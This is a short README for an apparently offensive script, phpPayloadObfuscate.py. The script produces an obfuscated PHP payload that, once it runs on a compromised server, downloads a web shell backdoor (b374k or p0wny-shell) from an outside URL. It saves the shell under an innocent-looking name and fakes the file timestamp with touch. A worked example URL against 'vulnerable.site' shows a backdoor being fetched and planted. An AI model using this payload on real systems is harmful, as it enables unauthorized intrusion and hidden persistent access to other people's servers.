## phpPayloadObfuscate.py
By default this script will generate an obfuscated PHP payload that when executed in a server will download a [b374k](https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/php/b374k.php) backdoor, save it as `obfuscated.php` in the same directory and send `touch` command to set 17-Aug-2021 10:23:42.

`path=` Where to save the backdoor (or file you wish)

`url=`The URL of the the backdoor (or file you wish)

`fname=` The name it'll be saved as on the server

In the following example the URL containing the payload that was uploaded (obfuscated.php) will pass the args `path` as being one directory above (../), the `url` to the [p0wny-shell](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php) backdoor to be saved as `fname` innocent.php:
```
http://vulnerable.site/uploads/obfuscated.php?path=../&url=https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php&fname=innocent.php
```
